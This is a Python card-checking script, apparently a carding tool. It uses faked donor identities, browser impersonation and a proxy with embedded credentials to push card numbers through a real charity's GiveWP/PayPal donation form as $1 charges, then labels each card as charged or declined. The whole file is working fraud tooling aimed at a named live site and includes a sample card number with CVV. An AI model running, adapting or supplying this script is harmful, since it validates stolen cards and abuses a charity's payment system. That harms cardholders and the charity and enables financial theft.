import re
import json
import base64
import secrets
import asyncio
from faker import Faker
from curl_cffi.requests import AsyncSession

# تم الاعتماد على الهوية الأمريكية US
fake = Faker("en_US")

class tools:
    @staticmethod
    def getcard(card: str) -> dict:
        parts = card.split("|")
        cc = parts[0].strip() if len(parts) > 0 else ""
        mm = parts[1].strip() if len(parts) > 1 else ""
        yy = parts[2].strip() if len(parts) > 2 else ""
        cvv = parts[3].strip() if len(parts) > 3 else ""
        
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[-2:]
        elif len(yy) == 2:
            yy = yy
            
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}

    @staticmethod
    def userdata() -> dict:
        fn = fake.first_name()
        ln = fake.last_name()
        return {
            "name": f"{fn} {ln}",
            "first": fn,
            "last": ln,
            "address": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip": fake.postcode(),
            "email": f"{fn.lower()}.{ln.lower()}@gmail.com",
            "phone": fake.phone_number(),
        }

RESPONSE_MAP = {
    "true": ("Success", "Charged - $1 ! ✅", True),
    "sucsess": ("Success", "Charged - $1 ! ✅", True),
    "do_not_honor": ("Declined", "Do Not Honor ❌", False),
    "account_closed": ("Declined", "Account Closed ❌", False),
    "payer_account_locked_or_closed": ("Declined", "Payer Account Locked Or Closed ❌", False),
    "insufficient_funds": ("Declined", "Insufficient Funds ❌", False),
    "generic_decline": ("Declined", "Generic Decline ❌", False),
    "transaction_not_permitted": ("Declined", "Transaction Not Permitted ❌", False),
    "payment_denied": ("Declined", "Payment Denied ❌", False),
    "invalid_transaction": ("Declined", "Invalid Transaction ❌", False),
}

class Gateway:
    @staticmethod
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        token = secrets.token_hex(16)

        # تحديد إصدار المتصفح chrome120
        async with AsyncSession(impersonate="chrome120", proxies=proxies) as session:
            try:
                # 1. الطلب الأولي (GET) - بدون تمرير ترويسات يدوية لتجنب التعارض
                resp_init = await session.get("https://bukjeh.org/donations/donation-2023-2-3/")
                html = resp_init.text
                
                # استخدام مكتبة re لاستخراج الحقول بدقة من الصفحة
                hash_match = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
                pre_match = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
                give_match = re.search(r'name="give-form-id"\s+value="([^"]+)"', html)
                
                if not hash_match or not pre_match or not give_match:
                    return "Error", "Missing form parameters (Regex failed to find fields)", False
                
                hash_val = hash_match.group(1)
                pre = pre_match.group(1)
                give = give_match.group(1)

                enc_match = re.search(r'"data-client-token":"([^"]+)"', html)
                if not enc_match:
                    return "Error", "data-client-token not found", False
                
                enc = enc_match.group(1)
                dec = base64.b64decode(enc).decode("utf-8")
                
                au_match = re.search(r'"accessToken":"([^"]+)"', dec)
                if not au_match:
                    return "Error", "accessToken not found", False
                au = au_match.group(1)

                # 2. طلب AJAX الأول
                headers_ajax = {
                    "origin": "https://bukjeh.org",
                    "referer": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "x-requested-with": "XMLHttpRequest"
                }
                
                data_ajax1 = {
                    "give-fee-amount": "0",
                    "give-fee-mode-enable": "false",
                    "give-fee-status": "enabled",
                    "give-honeypot": "",
                    "give-form-id-prefix": pre,
                    "give-form-id": give,
                    "give-form-title": "Help us make A'amar",
                    "give-current-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "give-form-url": "https://bukjeh.org/donations/donation-2023-2-3/",
                    "give-form-minimum": "1.00",
                    "give-form-maximum": "999999.99",
                    "give-form-hash": hash_val,
                    "give-price-id": "3",
                    "give-logged-in-only": "1",
                    "_give_is_donation_recurring": "0",
                    "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
                    "give-amount": "1.00",
                    "payment-mode": "paypal-commerce",
                    "give_first": user_data["first"],
                    "give_last": user_data["last"],
                    "give_email": user_data["email"],
                    "card_name": user_data["name"],
                    "give_action": "purchase",
                    "give-gateway": "paypal-commerce",
                    "action": "give_process_donation",
                    "give_ajax": "true"
                }
                
                await session.post(
                    "https://bukjeh.org/wp-admin/admin-ajax.php",
                    headers=headers_ajax,
                    data=data_ajax1
                )

                # 3. إنشاء طلب الدفع
                params_ajax2 = {"action": "give_paypal_commerce_create_order"}
                files_ajax2 = {
                    'give-form-id-prefix': (None, pre),
                    'give-form-id': (None, give),
                    'give-form-hash': (None, hash_val),
                    'give-amount': (None, '1.00'),
                    'give_first': (None, user_data["first"]),
                    'give_last': (None, user_data["last"]),
                    'give_email': (None, user_data["email"]),
                    'give-gateway': (None, 'paypal-commerce')
                }
                
                resp_ajax2 = await session.post(
                    "https://bukjeh.org/wp-admin/admin-ajax.php",
                    params=params_ajax2,
                    headers={"origin": "https://bukjeh.org", "referer": "https://bukjeh.org/donations/donation-2023-2-3/"},
                    files=files_ajax2
                )
                
                order_id = resp_ajax2.json().get("data", {}).get("id")
                if not order_id:
                    return "Error", "Failed to create PayPal order", False

                # 4. تأكيد البطاقة مع PayPal
                headers_paypal = {
                    "authorization": f"Bearer {au}",
                    "content-type": "application/json",
                    "origin": "https://assets.braintreegateway.com",
                    "paypal-client-metadata-id": token,
                    "referer": "https://assets.braintreegateway.com/"
                }
                json_paypal = {
                    "payment_source": {
                        "card": {
                            "number": card_data["cc"],
                            "expiry": f"20{card_data['yy']}-{card_data['mm']}",
                            "security_code": card_data["cvv"],
                            "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}}
                        }
                    },
                    "application_context": {"vault": False}
                }
                
                resp_paypal = await session.post(
                    f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
                    headers=headers_paypal,
                    json=json_paypal
                )
                paypal_text = resp_paypal.text.lower()

                # 5. الموافقة النهائية
                params_ajax3 = {"action": "give_paypal_commerce_approve_order", "order": order_id}
                resp_ajax3 = await session.post(
                    "https://bukjeh.org/wp-admin/admin-ajax.php",
                    params=params_ajax3,
                    headers={"origin": "https://bukjeh.org", "referer": "https://bukjeh.org/donations/donation-2023-2-3/"},
                    files=files_ajax2
                )
                approve_text = resp_ajax3.text.lower()

                combined_response = paypal_text + " " + approve_text

                # التحقق من النتيجة
                for key, (status, msg, is_live) in RESPONSE_MAP.items():
                    if key in combined_response:
                        return status, msg, is_live

                try:
                    error_data = resp_ajax3.json()
                    if 'data' in error_data and 'error' in error_data['data']:
                        return "Declined", f"{error_data['data']['error']} ❌", False
                except Exception:
                    pass

                return "Unknown", "Unrecognised response ❓", False

            except Exception as e:
                return "Error", f"Exception: {str(e)}", False


async def main():
    test_card = "4211566115568609|12|28|321"
    # استبدل البروكسي بالبروكسي المتاح لديك إذا رغبت
    proxy = "http://purevpn0s2232045:hww8fqbr72j0@px016104.pointtoserver.com:10780"
    proxies_dict = {"http": proxy, "https": proxy}
    
    print("🚀 Testing gateway (ST Charge)...")
    print(f"💳 Card: {test_card}")
    
    user_data = tools.userdata()
    card_data = tools.getcard(test_card)
    
    status, message, is_live = await Gateway.charge_card(card_data, user_data, proxies=proxies_dict)

    print("\n--- Execution Result ---")
    print(f"Status  : {status}")
    print(f"Message : {message}")
    print(f"Live    : {is_live}")

if __name__ == "__main__":
    asyncio.run(main())
